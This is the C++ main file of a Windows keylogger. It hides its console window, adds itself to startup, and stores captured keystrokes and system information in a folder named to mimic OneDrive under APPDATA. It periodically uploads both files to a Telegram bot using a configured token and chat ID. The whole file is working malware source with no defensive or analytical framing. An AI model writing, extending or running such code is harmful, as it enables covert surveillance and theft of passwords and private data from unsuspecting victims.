#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <cstring>
#include <sys/stat.h>
#include "logger.cpp"
#include "config.h"
#include "send_data.cpp"
#include <thread>
#include <chrono>
#include "get_system_info.h"
#include <filesystem>
#include "startup.h"

void periodicSend(const std::wstring &token, const std::wstring &chat_id, const std::wstring &filePath, const std::wstring &infoPath)
{
    while (true)
    {
        sendFileToTelegram(token, chat_id, filePath);
        sendFileToTelegram(token, chat_id, infoPath);
        std::this_thread::sleep_for(std::chrono::minutes(waitTime));
    }
}

void periodicCheckInfo(const std::wstring &filePath)
{
    while (true)
    {
        writeSystemInfoToFile(filePath);
        std::this_thread::sleep_for(std::chrono::minutes(waitTime));
    }
}

int main()
{
    setlocale(LC_ALL, "Russian");

    if (hideWindow == true)
    {
        ShowWindow(GetConsoleWindow(), SW_HIDE);
        HWND hwnd = GetConsoleWindow();
        ShowWindow(hwnd, SW_HIDE);
        LONG exStyle = GetWindowLong(hwnd, GWL_EXSTYLE);
        exStyle |= WS_EX_TOOLWINDOW;
        exStyle &= ~WS_EX_APPWINDOW;
        SetWindowLong(hwnd, GWL_EXSTYLE, exStyle);
        FreeConsole();
    }

    WCHAR lpFilePath[MAX_PATH];
    GetModuleFileNameW(NULL, lpFilePath, MAX_PATH);

    AddToStartup(lpFilePath);

    const char *userProfilePath = std::getenv("APPDATA");
    char dirPath[MAX_PATH] = {0};
    char infoPath[MY_MAX_PATH] = {0};

    snprintf(dirPath, MAX_PATH, "%s\\Onedrive", userProfilePath);
    snprintf(location, MY_MAX_PATH, "%s\\Onedrive\\keylog.txt", userProfilePath);
    snprintf(infoPath, MY_MAX_PATH, "%s\\Onedrive\\info.txt", userProfilePath);

    std::wstring wlocation;
    int len = MultiByteToWideChar(CP_ACP, 0, location, -1, NULL, 0);
    if (len > 1)
    {
        std::vector<wchar_t> buf(len);
        MultiByteToWideChar(CP_ACP, 0, location, -1, buf.data(), len);
        wlocation.assign(buf.data());
    }

    std::wstring winfoPath;
    int lenInfo = MultiByteToWideChar(CP_ACP, 0, infoPath, -1, NULL, 0);
    if (lenInfo > 1)
    {
        std::vector<wchar_t> bufInfo(lenInfo);
        MultiByteToWideChar(CP_ACP, 0, infoPath, -1, bufInfo.data(), lenInfo);
        winfoPath.assign(bufInfo.data());
    }

    DWORD ftyp = GetFileAttributesA(dirPath);
    if (ftyp == INVALID_FILE_ATTRIBUTES || !(ftyp & FILE_ATTRIBUTE_DIRECTORY))
    {
        if (!CreateDirectoryA(dirPath, NULL))
        {
            std::cerr << "Error: " << dirPath << std::endl;
            return 1;
        }
    }
    writeSystemInfoToFile(winfoPath);
    sendFileToTelegram(botToken, userID, winfoPath);

    std::thread sender(periodicSend, botToken, userID, wlocation, winfoPath);
    sender.detach();

    std::thread infoChecker(periodicCheckInfo, winfoPath);
    infoChecker.detach();

    HANDLE hThread1 = CreateThread(NULL, 0, Keylogger_main, NULL, 0, NULL);
    WaitForSingleObject(hThread1, INFINITE);

    while (true)
    {
        std::this_thread::sleep_for(std::chrono::hours(24));
    }

    return 0;
}
